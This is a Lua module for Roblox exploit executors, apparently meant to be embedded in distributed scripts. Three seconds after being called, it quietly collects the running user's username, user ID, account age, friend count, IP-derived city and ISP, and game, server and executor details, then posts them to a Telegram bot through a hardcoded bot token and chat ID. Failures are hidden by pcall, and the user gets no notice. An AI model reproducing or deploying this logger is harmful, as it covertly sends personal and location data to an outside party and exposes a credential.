local TeleLogger = {}

local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local BOT_TOKEN = "8672141972:AAGl0yGh16if3rm2EfplYfkruGLPwaW0bP4"
local CHAT_ID   = "5488313125"

-- Functions
local function getLocation()
    local ok, result = pcall(function()
        local res = request({ Url = "http://ip-api.com/json/", Method = "GET" })
        return HttpService:JSONDecode(res.Body)
    end)
    if ok and result and result.status == "success" then
        return result.city .. ", " .. result.countryCode, result.isp, result.timezone
    end
    return "Unknown", "Unknown", "Unknown"
end

local function getExecutor()
    if identifyexecutor then return identifyexecutor()
    elseif getexecutorname then return getexecutorname() end
    return "Unknown"
end

local function getAccountAge()
    local ok, result = pcall(function()
        local res  = game:HttpGet("https://users.roblox.com/v1/users/" .. LocalPlayer.UserId)
        local data = HttpService:JSONDecode(res)
        local y, m, d = data.created:match("(%d+)-(%d+)-(%d+)")
        local createdTime = os.time({ year = tonumber(y), month = tonumber(m), day = tonumber(d), hour = 0, min = 0, sec = 0 })
        return math.floor(os.difftime(os.time(), createdTime) / 86400) .. " hari"
    end)
    return ok and result or "Unknown"
end

local function getFriendCount()
    local ok, result = pcall(function()
        local res = game:HttpGet("https://friends.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/friends/count")
        return HttpService:JSONDecode(res).count
    end)
    return ok and tostring(result) or "Unknown"
end

local function getGameName()
    local ok, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return ok and result or "Unknown"
end

local function getPlayerCount()
    return #Players:GetPlayers() .. "/" .. Players.MaxPlayers
end

local function getPing()
    return math.floor(LocalPlayer:GetNetworkPing() * 1000) .. " ms"
end

local function getServerAge()
    local s = math.floor(workspace.DistributedGameTime)
    return math.floor(s / 60) .. " menit " .. (s % 60) .. " detik"
end

-- Main Send Function
function TeleLogger.Send(scriptName, extraInfo)
    task.spawn(function()
        task.wait(3)
        local city, isp, timezone = getLocation()

        -- Base extra info string
        local extraStr = ""
        if extraInfo then
            extraStr = "\n= INFO TAMBAHAN =\n"
            for k, v in pairs(extraInfo) do
                extraStr = extraStr .. string.format("%-13s: %s\n", k, tostring(v))
            end
        end

        local msg = string.format(
            "[%s - User Detected]\n\n" ..

            "= DATA USER =\n" ..
            "Username     : %s\n" ..
            "User ID      : %d\n" ..
            "Display Name : %s\n" ..
            "Account Age  : %s\n" ..
            "Teman        : %s\n" ..
            "Lokasi       : %s\n" ..
            "ISP          : %s\n\n" ..

            "= DATA GAME =\n" ..
            "Game         : %s\n" ..
            "Place ID     : %d\n" ..
            "Job ID       : %s\n" ..
            "Player       : %s\n" ..
            "Ping         : %s\n" ..
            "Umur Server  : %s\n\n" ..

            "= DATA SCRIPT =\n" ..
            "Script       : %s\n" ..
            "Executor     : %s\n" ..
            "%s\n" ..

            "= WAKTU =\n" ..
            "Tanggal      : %s\n" ..
            "Jam          : %s\n" ..
            "Timezone     : %s",

            scriptName,
            LocalPlayer.Name,
            LocalPlayer.UserId,
            LocalPlayer.DisplayName,
            getAccountAge(),
            getFriendCount(),
            city, isp,
            getGameName(),
            game.PlaceId,
            game.JobId,
            getPlayerCount(),
            getPing(),
            getServerAge(),
            scriptName,
            getExecutor(),
            extraStr,
            os.date("%Y-%m-%d"),
            os.date("%H:%M:%S"),
            timezone
        )

        pcall(function()
            request({
                Url     = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode({
                    chat_id = CHAT_ID,
                    text    = msg,
                })
            })
        end)
    end)
end

return TeleLogger
